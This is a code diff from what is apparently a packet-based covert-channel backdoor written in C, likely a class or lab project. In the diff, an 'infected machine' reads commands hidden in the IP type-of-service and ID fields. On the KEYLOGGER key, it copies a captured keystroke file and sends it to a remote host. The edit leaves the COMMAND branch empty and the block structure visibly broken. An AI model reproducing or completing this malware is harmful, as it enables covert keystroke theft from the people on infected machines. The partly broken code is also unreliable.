@@ -168,7 +168,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         }
     //infected machine receiving a command
     } else if(Filter->infected == true) {
-        switch(CheckKey(ip->ip_tos, ip->ip_id)) {
+        /*switch(CheckKey(ip->ip_tos, ip->ip_id)) {
             case COMMAND:
                 printf("COMMAND\n");
                 //write command to .cmd
@@ -200,11 +200,22 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                 break;
             default:
                 printf("DEBUG: Packet tossed wrong key\n");
-                break;
+                break;*/
+            if(CheckKey(ip->ip_tos, ip->ip_id) == COMMAND) {
+            } else if(CheckKey(ip->ip_tos, ip->ip_id) == KEYLOGGER){
+                printf("KEYLOGGER\n");
+                //copy keylogger file to results file
+                system("cat .keylogger.txt > .results");
+                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
+        
+            } else {
+                printf("DEBUG: Packet tossed wrong key\n");
+
+            }
         }
 
+
         //send results file
-    }
 
     fclose(fp);
 }
